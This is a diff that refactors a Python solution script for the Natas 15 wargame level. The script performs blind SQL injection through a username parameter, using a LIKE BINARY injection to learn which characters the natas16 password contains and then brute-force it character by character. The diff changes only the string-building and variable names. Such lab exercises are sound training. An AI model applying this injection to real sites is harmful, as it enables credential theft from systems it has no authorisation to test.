@@ -14,8 +14,7 @@ def find_password_letters():
     letters = []
     print("Finding password letters...")
     for c in characters:
-        uri = ''.join([url, '?', 'username=natas16"',
-                      '+and+password+LIKE+BINARY+"%', c, '%', '&debug'])
+        uri = url + '?username=natas16"+and+password+LIKE+BINARY+"%' + c + '%&debug'
         r = requests.get(uri, auth=(natas15_username, natas15_password))
         if success_phrase in r.text:
             letters.append(c)
@@ -26,13 +25,12 @@ def find_password_letters():
 def brute_force_password(password_letters):
     print("Brute-forcing password...")
     password = ""
-    for i in range(1, 64):
+    for _ in range(1, 64):
         for c in password_letters:
-            test = "".join([password, c])
-            uri = "".join([url, '?', 'username=natas16"',
-                           '+and+password+LIKE+BINARY+"', test, '%', '&debug'])
-            r = requests.get(uri, auth=(natas15_username, natas15_password))
-            if success_phrase in r.text:
+            test = password + c
+            uri = url + '?username=natas16"+and+password+LIKE+BINARY+"' + test + '%&debug'
+            resp = requests.get(uri, auth=(natas15_username, natas15_password))
+            if success_phrase in resp.text:
                 password += c
     print("Brute-forcing password complete!")
     return password
